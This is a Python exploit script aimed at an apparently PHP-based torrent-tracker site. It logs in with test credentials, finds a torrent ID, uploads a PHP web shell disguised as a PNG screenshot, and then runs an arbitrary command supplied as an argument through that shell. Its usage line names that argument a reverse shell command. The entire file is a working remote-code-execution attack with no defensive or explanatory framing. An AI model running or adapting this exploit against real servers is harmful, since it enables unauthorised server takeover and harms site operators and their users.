import requests
import sys
from bs4 import BeautifulSoup

# Ensure correct number of arguments (script name + 2 arguments)
if len(sys.argv) != 3:
    print(f"[!] Usage: {sys.argv[0]} <Target_URL> <Reverse_Shell_Command>")
    sys.exit(1)

# Normalize base URL (remove trailing slash if present)
base = sys.argv[1].rstrip("/")
s = requests.Session()

# =============================
# 1. Login step
# =============================
login_data = {
    "username": "test",
    "password": "test",
}
r = s.post(base + "/torrent/login.php", data=login_data, allow_redirects=False)

if r.status_code == 302:
    print("[+] Successfully logged in")
else:
    print("[!] Login attempt failed")
    sys.exit(1)

# =============================
# 2. Retrieve torrent list and extract first ID
# =============================
resp = s.get(base + "/torrent/index.php?mode=directory")
soup = BeautifulSoup(resp.text, "html.parser")

torrent_id = None
for a in soup.find_all("a", href=True):
    if "torrents.php?mode=details&id=" in a["href"]:
        torrent_id = a["href"].split("id=")[-1]
        break

if not torrent_id:
    print("[!] No torrent ID was found on the directory page")
    sys.exit(1)

print(f"[+] Torrent ID discovered: {torrent_id}")

# =============================
# 3. Build upload URL for malicious file
# =============================
upload_url = f"{base}/torrent/upload_file.php?mode=upload&id={torrent_id}"
print(f"[+] Preparing to upload payload to: {upload_url}")

# =============================
# 4. Define malicious PHP payload (inline, no local file needed)
# =============================
php_file_content = b"<?php system($_REQUEST['cmd']); ?>"  
# ^ Replace with custom payload if needed

files = {
    "file": ("cmd.php", php_file_content, "image/png"),  # disguised as image
}
data = {
    "submit": "Submit Screenshot"
}

# =============================
# 5. Upload malicious file
# =============================
res = s.post(upload_url, files=files, data=data)

if res.status_code == 200:
    print("[+] Malicious file uploaded successfully")
    uploaded_url = f"{base}/torrent/upload/{torrent_id}.php"
    print(f"[+] Payload available at: {uploaded_url}")
    
    # Execute provided command through uploaded webshell
    cmds = sys.argv[2]
    resexp = s.post(f"{uploaded_url}?cmd={cmds}")
    print("[+] Command execution output:")
    print(resexp.content.decode(errors="ignore"))
else:
    print("[!] File upload failed")
